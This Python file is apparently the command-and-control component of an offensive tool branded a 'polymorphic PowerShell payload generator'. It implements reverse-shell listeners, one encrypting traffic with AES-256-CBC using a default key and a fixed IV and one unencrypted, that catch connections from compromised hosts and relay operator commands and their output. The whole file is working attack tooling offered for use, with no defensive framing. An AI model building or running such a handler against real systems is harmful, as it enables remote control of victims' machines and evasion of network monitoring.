#!/usr/bin/env python3
"""
▄▖  ▜   ▄▖         P01ym0rph1c
▙▌▛▌▐ ▌▌▙▖▚▘█▌▛▘   P0w3rSh3ll
▌ ▙▌▐▖▙▌▙▖▞▖▙▖▙▖   P4yl04d
      ▄▌           G3n3r4t0r
 x: @st8less
 
C2 AES-256 sh3ll catch3r

"""

import socket
import base64
import threading
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import sys

class EncryptedListener:
    def __init__(self, host='0.0.0.0', port=4444, key='MySecretKey123'):
        self.host = host
        self.port = port
  #    is key 32 bytes for AES-256
        self.key = key.ljust(32)[:32].encode()
        self.iv = b'1234567890123456'
        
    def encrypt(self, plaintext):
        """AES-256"""
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        padded = pad(plaintext.encode(), AES.block_size)
        encrypted = cipher.encrypt(padded)
        return base64.b64encode(encrypted).decode()
    
    def decrypt(self, ciphertext):
        """decrypt"""
        try:
            cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
            encrypted = base64.b64decode(ciphertext)
            decrypted = cipher.decrypt(encrypted)
            return unpad(decrypted, AES.block_size).decode()
        except Exception as e:
            return f"[decrypt issue: {e}]"
    
    def handle_client(self, client_socket, addr):
        """client connection"""
        print(f"\n[+] Connection from {addr[0]}:{addr[1]}")
        
        try:
              # RX beacon init
            beacon = client_socket.recv(4096).decode().strip()
            if beacon:
                decrypted_beacon = self.decrypt(beacon)
                print(f"[*] Beacon: {decrypted_beacon}")
            
            print(f"[*] you popped a shell. Type 'exit' to close tunnel. \n")
            
            while True:
                    # get command frm operator
                command = input(f"{addr[0]}> ").strip()
                
                if not command:
                    continue
                
          # encrypt and TX command
                encrypted_cmd = self.encrypt(command)
                client_socket.send((encrypted_cmd + '\n').encode())
                
                if command.lower() == 'exit':
                    print("[*] closing connection...")
                    break
                
                # RX response
                response = client_socket.recv(65536).decode().strip()
                
                if response:
                    # decrypt and display
                    decrypted = self.decrypt(response)
                    print(decrypted)
                    if not decrypted.endswith('\n'):
                        print()  # needed to add newline 
                        
        except ConnectionResetError:
            print(f"\n[-] connection lost from {addr[0]}")
        except KeyboardInterrupt:
            print("\n[*] interrupted by user")
        except Exception as e:
            print(f"\n[-] Error: {e}")
        finally:
            client_socket.close()
            print(f"[-] connection closed: {addr[0]}")
    
    def start(self):
        """start listener"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server.bind((self.host, self.port))
            server.listen(5)
            
            print(f"""
            ▄▖  ▜   ▄▖         P01ym0rph1c
            ▙▌▛▌▐ ▌▌▙▖▚▘█▌▛▘   P0w3rSh3ll
            ▌ ▙▌▐▖▙▌▙▖▞▖▙▖▙▖   P4yl04d
                  ▄▌           G3n3r4t0r
             x: @st8less

[*] listening on {self.host}:{self.port}
[*] Encryption: AES-256-CBC
[*] Key: {self.key.decode()[:16]}...
[*] waiting for connections...
            """)
            
            while True:
                client, addr = server.accept()
         # separate threads for multi-session support!! def debug
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client, addr)
                )
                client_thread.daemon = True
                client_thread.start()
                
        except KeyboardInterrupt:
            print("\n[*] Server shutting down...")
        except Exception as e:
            print(f"[-] Server error: {e}")
        finally:
            server.close()


class StandardListener:
    """standard netcat like listener for unencrypted sea shells"""
    
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
    
    def start(self):
        """start standard listener"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server.bind((self.host, self.port))
            server.listen(1)
            
            print(f"""
            ▄▖  ▜   ▄▖         P01ym0rph1c
            ▙▌▛▌▐ ▌▌▙▖▚▘█▌▛▘   P0w3rSh3ll
            ▌ ▙▌▐▖▙▌▙▖▞▖▙▖▙▖   P4yl04d
                  ▄▌           G3n3r4t0r
             x: @st8less

[*] Listening on {self.host}:{self.port}
[*] Waiting for connection...
            """)
            
            client, addr = server.accept()
            print(f"[+] Connection from {addr[0]}:{addr[1]}\n")
            
            # Interactive shell
            while True:
                # Receive data
                data = client.recv(4096).decode('utf-8', errors='ignore')
                if not data:
                    break
                
                print(data, end='')
                
                # Send command
                if data.endswith('> '):
                    command = input()
                    if command.strip().lower() == 'exit':
                        client.send(b'exit\n')
                        break
                    client.send((command + '\n').encode())
            
            client.close()
            print("\n[-] Connecion closed")
            
        except KeyboardInterrupt:
            print("\n[*] Server shutting down?")
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            server.close()


def main():
    print("""
▄▖  ▜   ▄▖         P01ym0rph1c
▙▌▛▌▐ ▌▌▙▖▚▘█▌▛▘   P0w3rSh3ll
▌ ▙▌▐▖▙▌▙▖▞▖▙▖▙▖   P4yl04d
      ▄▌           G3n3r4t0r
 x: @st8less
 C2 AES-256 sh3ll catch3r
    
    [1] Encrypted Listener (AES-256)
    [2] Standard Listener (unencrypted)
    [3] CONFIG
    """)
    
    choice = input("Select listener type [1/2/3]: ").strip()
    
    if choice == '1':
        key = input("Enter encryption key (default: MySecretKey123): ").strip() or "MySecretKey123"
        port = input("Enter port (default: 4444): ").strip() or "4444"
        listener = EncryptedListener(port=int(port), key=key)
        listener.start()
        
    elif choice == '2':
        port = input("PORT? (default: 4444): ").strip() or "4444"
        listener = StandardListener(port=int(port))
        listener.start()
        
    elif choice == '3':
        host = input("Enter bind address (default: 0.0.0.0): ").strip() or "0.0.0.0"
        port = int(input("Enter port (default: 4444): ").strip() or "4444")
        enc = input("Use encryption? (y/n): ").strip().lower()
        
        if enc == 'y':
            key = input("whats the encryption key: ").strip()
            listener = EncryptedListener(host=host, port=port, key=key)
        else:
            listener = StandardListener(host=host, port=port)
        
        listener.start()
    else:
        print("[-] try again")
        sys.exit(1)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] fine, bye.")
        sys.exit(0)
